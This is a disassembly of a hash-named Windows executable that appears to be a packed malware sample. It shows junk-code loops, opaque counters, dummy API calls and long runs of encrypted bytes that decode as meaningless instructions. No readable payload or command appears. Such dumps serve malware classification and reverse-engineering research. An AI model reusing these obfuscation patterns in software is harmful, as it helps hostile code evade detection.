
c5e564227f6d9e566890431046d57079828cd8dccc163f412688fbc4117875dd.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433797,0x1c
  401013:	cmp    DWORD PTR ds:0x433797,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433797,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433797,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433797
  401055:	dec    eax
  401056:	mov    ds:0x433797,eax
  40105b:	mov    eax,ds:0x433797
  401060:	dec    eax
  401061:	mov    ds:0x433797,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43379b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43379f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4337d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4337af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433793
  4010b6:	mov    DWORD PTR ds:0x4337af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43382b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4337af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4337af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4337af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4337af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4337af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4337af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4337af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4337af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433777
  40113c:	mov    eax,ds:0x433833
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43381b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4336ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43371f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43375b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [ecx+0x7eba77cc],bl
  4011bc:	jle    0x40123c
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    BYTE PTR [edx+0x0],ah
  4011d2:	rdpmc  
  4011d4:	xadd   BYTE PTR [eax],bl
  4011d7:	(bad)  
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x2619b73a
  40126d:	cmp    BYTE PTR [ebp+0x7e12e7cb],0xd7
  401274:	and    eax,0x57a5a96
  401279:	ffree  st(7)
  40127b:	sub    DWORD PTR [ecx+0x22b53046],ecx
  401281:	rol    BYTE PTR [esi+eiz*4+0x43e51aa0],cl
  401288:	cwde   
  401289:	enter  0xa14c,0x6f
  40128d:	lods   eax,DWORD PTR ds:[esi]
  40128e:	and    cl,BYTE PTR [ebx-0x5b]
  401291:	or     ecx,esp
  401293:	ficomp WORD PTR [esi+esi*4+0x22]
  401297:	jne    0x401259
  401299:	nop
  40129a:	icebp  
  40129b:	jns    0x4012f1
  40129d:	and    al,0x27
  40129f:	xchg   BYTE PTR cs:[edi-0x353492b],dh
  4012a6:	mov    edi,DWORD PTR [ecx-0x63f38f28]
  4012ac:	mov    cl,0xde
  4012ae:	add    eax,0x50b66f6d
  4012b3:	push   0x2f9863dc
  4012b8:	sar    BYTE PTR [eax+ebx*8-0x1a43697e],1
  4012bf:	xor    eax,0x8786a5b
  4012c4:	rcl    BYTE PTR ds:0x8cf7c534,0x20
  4012cb:	adc    BYTE PTR [edi-0x22],cl
  4012ce:	lods   eax,DWORD PTR ds:[esi]
  4012cf:	push   ebx
  4012d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012d1:	inc    esi
  4012d2:	jno    0x40130b
  4012d4:	test   BYTE PTR [eax+0x29],dh
  4012d7:	ret    0xbd50
  4012da:	mov    esi,0x7b8b05d2
  4012df:	xchg   ecx,eax
  4012e0:	and    al,0xdc
  4012e2:	inc    esi
  4012e3:	(bad)  
  4012e4:	fldcw  WORD PTR [ecx]
  4012e6:	dec    edi
  4012e7:	in     al,0xe9
  4012e9:	stc    
  4012ea:	mov    edi,0xc382a231
  4012ef:	add    eax,0x2141589b
  4012f4:	cmc    
  4012f5:	add    DWORD PTR [eax+0x4b],ebp
  4012f8:	mov    esi,0x245649e1
  4012fd:	push   ebp
  4012fe:	sbb    edx,DWORD PTR [ebp+0x6953d095]
  401304:	add    ecx,edx
  401306:	scas   al,BYTE PTR es:[edi]
  401307:	and    bl,BYTE PTR [ebx+eiz*2]
  40130a:	fsubr  DWORD PTR [edx+ebp*2]
  40130d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40130e:	xor    esi,DWORD PTR [edi-0x5a21a1c3]
  401314:	mov    ebp,0x93637565
  401319:	lods   eax,DWORD PTR ds:[esi]
  40131a:	jge    0x401301
  40131c:	cdq    
  40131d:	xor    BYTE PTR [esi],bh
  40131f:	push   ecx
  401320:	scas   al,BYTE PTR es:[edi]
  401321:	mov    ebx,0xed898c2
  401327:	jg     0x40135d
  401329:	mov    dl,0x0
  40132b:	jne    0x401392
  40132d:	pop    ebp
  40132e:	jecxz  0x401363
  401330:	mov    dh,0xd7
  401332:	fst    QWORD PTR ds:0xdf11aad0
  401338:	stos   BYTE PTR es:[edi],al
  401339:	in     eax,dx
  40133a:	data16 arpl WORD PTR [edi+0x1d42332],bp
  401341:	imul   eax,DWORD PTR [ecx-0x43],0xffffffa1
  401345:	bound  ebx,QWORD PTR [eax-0x7e0bba77]
  40134b:	and    eax,0x433753
  401350:	add    BYTE PTR [eax],al
  401352:	add    BYTE PTR [eax],al
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433753
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433753,ebx
  401366:	cmp    DWORD PTR ds:0x433753,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433753,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43370b,0x4336ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	arpl   WORD PTR [ebx+0x38],bx
  4013b6:	ja     0x4013b2
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x401390
  4013c0:	add    bl,BYTE PTR [eax+0x5da6b5e5]
  4013c6:	fisubr DWORD PTR [edx]
  4013c8:	shr    BYTE PTR [ebx-0x30],0xbe
  4013cc:	test   DWORD PTR [ebx-0x6c],ebx
  4013cf:	adc    edx,0x677cef8
  4013d5:	sbb    DWORD PTR [ecx-0x782819df],esp
  4013db:	adc    esi,eax
  4013dd:	push   edx
  4013de:	pop    esi
  4013df:	ret    0x245c
  4013e2:	mov    ebp,DWORD PTR [eax]
  4013e4:	jbe    0x401398
  4013e6:	inc    ecx
  4013e7:	std    
  4013e8:	cmp    BYTE PTR [eax+eiz*2],0x6
  4013ec:	xchg   DWORD PTR [ecx],ebx
  4013ee:	fld    st(1)
  4013f0:	cmp    BYTE PTR ds:0xdbe1a74a,0xb
  4013f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013f8:	mov    ebp,0x32313e34
  4013fd:	scas   eax,DWORD PTR es:[edi]
  4013fe:	sbb    al,BYTE PTR [edx+0x67]
  401401:	fs ret 0x8d2d
  401405:	xchg   ebp,eax
  401406:	mov    al,ds:0xfdd0e1c3
  40140b:	int3   
  40140c:	add    al,0x3a
  40140e:	out    dx,al
  40140f:	adc    esp,DWORD PTR [esi+0x7c9943ce]
  401415:	jno    0x401449
  401417:	or     dh,dl
  401419:	sar    DWORD PTR ds:0xda279d13,cl
  40141f:	int3   
  401420:	lock sub ecx,DWORD PTR [esi+edi*2-0x13c63342]
  401428:	push   0x7182df73
  40142d:	int    0xfc
  40142f:	jge    0x401428
  401431:	sbb    DWORD PTR [esi-0x2c7ec4fd],0xe
  401438:	xchg   ebx,eax
  401439:	gs mov esp,0x7ca213fa
  40143f:	sbb    ebx,esi
  401441:	cwde   
  401442:	test   DWORD PTR ds:0x614b8266,edi
  401448:	(bad)  
  401449:	leave  
  40144a:	mov    ebp,0x642ce51f
  40144f:	out    0x7e,al
  401451:	lahf   
  401452:	or     eax,0x1afc62ab
  401457:	call   0xb98c:0x8188202
  40145e:	and    ebx,DWORD PTR [esi]
  401460:	dec    DWORD PTR ds:[edi+0x9]
  401464:	int3   
  401465:	(bad)  
  401466:	mov    cl,0x33
  401468:	test   BYTE PTR [esi+0x4c],ah
  40146b:	pop    edi
  40146c:	inc    edi
  40146d:	mov    eax,ds:0x6b001e24
  401472:	inc    eax
  401473:	das    
  401474:	sbb    ah,BYTE PTR [edx]
  401476:	mov    bl,0x9c
  401478:	mov    edi,0x54391711
  40147d:	out    dx,eax
  40147e:	loop   0x4014c6
  401480:	xchg   BYTE PTR [eax-0x7698211c],cl
  401486:	mov    ebp,0x339f0750
  40148b:	in     al,0x54
  40148d:	(bad)  
  40148f:	pop    es
  401490:	jmp    0x4014d0
  401492:	inc    ecx
  401493:	stos   BYTE PTR es:[edi],al
  401494:	inc    ebx
  401495:	cwde   
  401496:	dec    esp
  401497:	inc    ecx
  401498:	int    0x90
  40149a:	arpl   WORD PTR [esi-0x4affaf4],sp
  4014a0:	push   edx
  4014a1:	pop    esi
  4014a2:	rcl    DWORD PTR [eax-0x3f],cl
  4014a5:	(bad)
  4014a8:	sub    eax,ebp
  4014aa:	(bad)  
  4014ab:	xchg   edx,eax
  4014ac:	out    0xc0,al
  4014ae:	into   
  4014af:	push   esi
  4014b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014b1:	dec    esp
  4014b2:	rcl    DWORD PTR ds:0xa7f95dc3,cl
  4014b8:	jge    0x4014bb
  4014ba:	inc    ecx
  4014bb:	add    edx,DWORD PTR [edi]
  4014bd:	xor    edx,DWORD PTR [eax-0x1f]
  4014c0:	pushf  
  4014c1:	nop
  4014c2:	loopne 0x401446
  4014c4:	mov    edx,0x5e21d5dc
  4014c9:	ins    BYTE PTR es:[edi],dx
  4014ca:	jns    0x401460
  4014cc:	mov    cl,al
  4014ce:	mov    ah,0x46
  4014d0:	add    eax,0x7b73e4f2
  4014d5:	scas   al,BYTE PTR es:[edi]
  4014d6:	shl    ebp,1
  4014d8:	mov    edx,0xceb342d6
  4014dd:	dec    DWORD PTR [ecx+0x17346284]
  4014e3:	xchg   esp,eax
  4014e4:	push   0x2532fae
  4014e9:	scas   eax,DWORD PTR es:[edi]
  4014ea:	stc    
  4014eb:	nop
  4014ec:	call   0x8f3c:0xa1954ad1
  4014f3:	aaa    
  4014f4:	fisubr WORD PTR [ecx]
  4014f6:	test   BYTE PTR [eax+eax*4-0x7b],ch
  4014fa:	in     eax,0x65
  4014fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014fd:	mov    cl,0x1d
  4014ff:	repnz mov eax,ds:0xf81dd766
  401505:	cs in  al,0x5e
  401508:	jne    0x401562
  40150a:	cmp    eax,esi
  40150c:	retf   0x6f79
  40150f:	pusha  
  401510:	ficomp DWORD PTR [esp+eiz*8]
  401513:	js     0x4014df
  401515:	sub    eax,0xc002dbfc
  40151a:	pop    eax
  40151b:	cld    
  40151c:	test   eax,0xb16f4e8
  401521:	inc    ebx
  401522:	xchg   BYTE PTR [ebx-0x26e3cdef],bh
  401528:	push   eax
  401529:	add    eax,0xc11fecb1
  40152e:	pop    eax
  40152f:	pop    esp
  401530:	cmc    
  401531:	jae    0x401512
  401533:	or     dh,cl
  401535:	repz cmp eax,0xfd2a21dc
  40153b:	xor    BYTE PTR [esp+edx*4+0x7232f585],dh
  401542:	ja     0x4014cf
  401544:	inc    ebp
  401545:	les    esi,FWORD PTR [ecx]
  401547:	sbb    eax,0x43370f
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x342a991d]
  401564:	pushw  es
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x4015e5
  40156e:	fs je  0x4015a7
  401571:	sar    BYTE PTR [eax+eiz*8-0x3e6520fe],0x62
  401579:	arpl   WORD PTR [esi],bx
  40157b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40157c:	push   es
  40157d:	mov    ebp,0x35813586
  401582:	leave  
  401583:	daa    
  401584:	scas   al,BYTE PTR es:[edi]
  401585:	mov    ah,0x9d
  401587:	xor    eax,0xb67fbc87
  40158c:	dec    ecx
  40158d:	stos   DWORD PTR es:[edi],eax
  40158e:	sub    eax,0xdbc365c3
  401593:	test   dl,cl
  401595:	or     ebp,DWORD PTR [ecx+0x30]
  401598:	imul   edx,DWORD PTR [edi+edx*2+0x1bf4edc],0x62
  4015a0:	mov    ah,0x1
  4015a2:	mov    ds:0xe02e2a6e,eax
  4015a7:	scas   eax,DWORD PTR es:[edi]
  4015a8:	addps  xmm3,XMMWORD PTR [ebp+0x2e91247f]
  4015af:	shl    DWORD PTR [ebp+esi*2-0x2991c71c],1
  4015b6:	or     esp,DWORD PTR [esi-0x2e4fffef]
  4015bc:	and    ah,cl
  4015be:	xor    cl,al
  4015c0:	add    bh,ch
  4015c2:	out    0x72,eax
  4015c4:	mov    dh,ch
  4015c6:	or     al,BYTE PTR [ecx+0x51]
  4015c9:	sahf   
  4015ca:	mov    edx,0x2311e147
  4015cf:	bswap  ecx
  4015d1:	stc    
  4015d2:	inc    edi
  4015d3:	popa   
  4015d4:	std    
  4015d5:	mov    ah,0xce
  4015d7:	rcr    DWORD PTR [esi+0x5],1
  4015da:	xchg   esi,eax
  4015db:	adc    DWORD PTR [edi-0x33],esp
  4015de:	test   DWORD PTR [eax+0x16],edx
  4015e1:	cdq    
  4015e2:	lods   eax,DWORD PTR ds:[esi]
  4015e3:	xchg   DWORD PTR ds:0x4f620f65,ecx
  4015e9:	ret    
  4015ea:	cli    
  4015eb:	jns    0x40159e
  4015ed:	cli    
  4015ee:	int    0x9b
  4015f0:	push   edx
  4015f1:	pop    ebx
  4015f2:	shr    esp,0x36
  4015f5:	mov    eax,ds:0x239ff1f6
  4015fa:	mov    ebx,edx
  4015fc:	fnsave [eax]
  4015fe:	inc    ebp
  4015ff:	pop    ds
  401600:	sub    BYTE PTR [eax+0x1a],bh
  401603:	pusha  
  401604:	xor    eax,0xd51962b
  401609:	mov    al,ds:0xcfaa7b79
  40160e:	xor    al,0x5a
  401610:	sub    BYTE PTR [edi+ebx*1+0x1],0x87
  401615:	mov    cl,0x84
  401617:	mov    es,ebp
  401619:	and    al,0xc2
  40161b:	daa    
  40161c:	jmp    0x4015e9
  40161e:	pop    ds
  40161f:	adc    dh,bh
  401621:	das    
  401622:	jmp    0xa38d8968
  401627:	mov    cl,0x4a
  401629:	or     ebx,DWORD PTR [eax]
  40162b:	cmp    BYTE PTR [esi+0x7e14ff9f],dh
  401631:	repz sbb DWORD PTR [eax+0x4d60b5ae],esp
  401638:	push   edx
  401639:	fisubr DWORD PTR [ecx+0x39]
  40163c:	das    
  40163d:	sbb    DWORD PTR [ebp+0x30],eax
  401640:	mov    BYTE PTR [edi-0x7],bl
  401643:	in     al,dx
  401644:	mov    al,0x89
  401646:	pop    edi
  401647:	sub    al,0x14
  401649:	push   ecx
  40164a:	mov    esi,0x50881c29
  40164f:	cmc    
  401650:	xor    al,0x94
  401652:	leave  
  401653:	push   esp
  401654:	mov    al,0x45
  401656:	(bad)  
  401657:	pop    eax
  401658:	test   eax,0x62f53cd
  40165d:	jmp    0xee238433
  401662:	push   es
  401663:	pop    ebx
  401664:	dec    esp
  401665:	mov    ah,0x1c
  401667:	repz inc edi
  401669:	push   0x10
  40166b:	add    BYTE PTR [ebx+eiz*8-0x4621d804],cl
  401672:	and    esi,edi
  401674:	add    DWORD PTR [esi+0x19],0x19209a81
  40167b:	add    eax,0xc5d5559d
  401680:	scas   eax,DWORD PTR es:[edi]
  401681:	add    DWORD PTR [esi+0x1b],0x1136473f
  401688:	add    DWORD PTR [ebp+0x5ac0a685],edx
  40168e:	inc    ecx
  40168f:	dec    edx
  401690:	not    DWORD PTR [ebx]
  401692:	js     0x4016c8
  401694:	cmp    al,BYTE PTR [esi-0x7d]
  401697:	push   ebx
  401698:	adc    BYTE PTR [eax+0x3f],0x86
  40169c:	jmp    0xc58f:0x14f43558
  4016a3:	aad    0x57
  4016a5:	sub    al,0xae
  4016a7:	imul   DWORD PTR [eax]
  4016a9:	ror    BYTE PTR [edi+0x68],0x3c
  4016ad:	pop    eax
  4016ae:	or     dl,BYTE PTR ds:0xa8cc048b
  4016b4:	sti    
  4016b5:	cmp    ebx,0xffffff84
  4016b8:	std    
  4016b9:	adc    ebp,DWORD PTR [ebx]
  4016bb:	bound  edi,QWORD PTR [edi+0xcb9c68b]
  4016c1:	in     al,0x1c
  4016c3:	(bad)  
  4016c5:	jno    0x4016a4
  4016c7:	xchg   ebp,eax
  4016c8:	icebp  
  4016c9:	daa    
  4016ca:	lea    eax,[ebx+eax*8]
  4016cd:	call   0x509a468e
  4016d2:	jno    0x401677
  4016d4:	lods   eax,DWORD PTR ds:[esi]
  4016d6:	sub    esp,esp
  4016d8:	fwait
  4016d9:	je     0x4016e2
  4016db:	aam    0xb4
  4016dd:	pop    ebx
  4016de:	and    eax,0x67a2e460
  4016e3:	scas   eax,DWORD PTR es:[edi]
  4016e4:	xor    esp,esp
  4016e6:	sub    eax,DWORD PTR [ebp+0x4e5bc46e]
  4016ec:	dec    esi
  4016ed:	or     DWORD PTR [eax-0x38fcbf0b],edx
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4337df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4337df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4337df,ebx
  401721:	cmp    DWORD PTR ds:0x4337df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4337df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4337df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4337df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4337df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433703,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433717
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43370b
  401793:	and    ecx,DWORD PTR ds:0x43375b
  401799:	mov    DWORD PTR ds:0x43370b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43382f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43382f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43382f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43382f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43382f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43382f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43382f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43382f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4337e3,0x0
  401819:	mov    eax,ds:0x4337e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4337e3,eax
  401824:	cmp    DWORD PTR ds:0x4337e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433723
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4337e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43381f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43382b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43382b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43382b,ecx
  401878:	cmp    DWORD PTR ds:0x43382b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43382b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43382b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43382b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43382b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x249c6ade
  4018e9:	mov    ?,WORD PTR [ebx-0x7e]
  4018ec:	jp     0x40196c
  4018ee:	jle    0x4018ea
  4018f0:	jg     0x401970
  4018f2:	jle    0x4018bf
  4018f4:	retf   0x6282
  4018f7:	(bad)  
  4018f8:	repz inc esp
  4018fa:	jns    0x40193d
  4018fc:	push   edi
  4018fd:	adc    eax,0xb7e58
  401902:	add    eax,0xde75ea4
  401907:	mov    ch,0x2d
  401909:	outs   dx,BYTE PTR ds:[esi]
  40190a:	dec    BYTE PTR [ebp+0x75]
  40190d:	mov    dh,0x52
  40190f:	fistp  QWORD PTR [ecx-0x6d]
  401912:	test   eax,0xdaee93c5
  401917:	jge    0x40196c
  401919:	inc    ebp
  40191a:	xchg   ebp,eax
  40191b:	iret   
  40191c:	pop    eax
  40191d:	push   cs
  40191e:	into   
  40191f:	test   eax,0x763696e
  401924:	(bad)  
  401925:	pop    ebp
  401926:	mov    bh,0x49
  401928:	xchg   edi,eax
  401929:	and    DWORD PTR [ebp+eax*4-0x4b276e2c],ecx
  401930:	retf   
  401931:	ret    0xd259
  401934:	adc    al,0x72
  401936:	rcr    DWORD PTR [edx],0x50
  401939:	(bad)  
  40193a:	loopne 0x40195a
  40193c:	aas    
  40193d:	ins    BYTE PTR es:[edi],dx
  40193e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40193f:	jne    0x4018e8
  401941:	dec    ebp
  401942:	(bad)  
  401943:	stc    
  401944:	bound  ebx,QWORD PTR [edx+0x3515b32e]
  40194a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40194b:	cld    
  40194c:	dec    ebx
  40194d:	repz pusha 
  40194f:	mov    dh,0xf5
  401951:	iret   
  401952:	xchg   ecx,eax
  401953:	js     0x40193d
  401955:	sbb    ecx,DWORD PTR [eax-0x4fbe3695]
  40195b:	mov    ds:0xfd96004e,eax
  401960:	loopne 0x401984
  401962:	ds gs int 0x5a
  401966:	adc    eax,0x4382253
  40196b:	xchg   BYTE PTR [eax+esi*2-0x71e044c3],al
  401972:	mov    ch,0x90
  401974:	push   ss
  401975:	push   esi
  401976:	add    ebp,DWORD PTR [edi-0x1b]
  401979:	push   esp
  40197a:	ret    0x2ca7
  40197d:	cmp    eax,0xd5906b96
  401982:	aas    
  401983:	scas   eax,DWORD PTR es:[edi]
  401984:	ds jb  0x4019a1
  401987:	(bad)  
  401988:	mov    ds,esi
  40198a:	rcr    DWORD PTR [edx+0x2c],0xbf
  40198e:	ficom  DWORD PTR [edi+0x4a8a38db]
  401994:	adc    bh,BYTE PTR [esi]
  401996:	icebp  
  401997:	pushf  
  401998:	ss push ebx
  40199a:	xor    al,0xb9
  40199c:	cmp    ecx,ebx
  40199e:	mov    eax,ds:0x321380b2
  4019a3:	push   eax
  4019a4:	daa    
  4019a5:	push   0xffffffb2
  4019a7:	(bad)  
  4019a8:	jp     0x401994
  4019aa:	loopne 0x401954
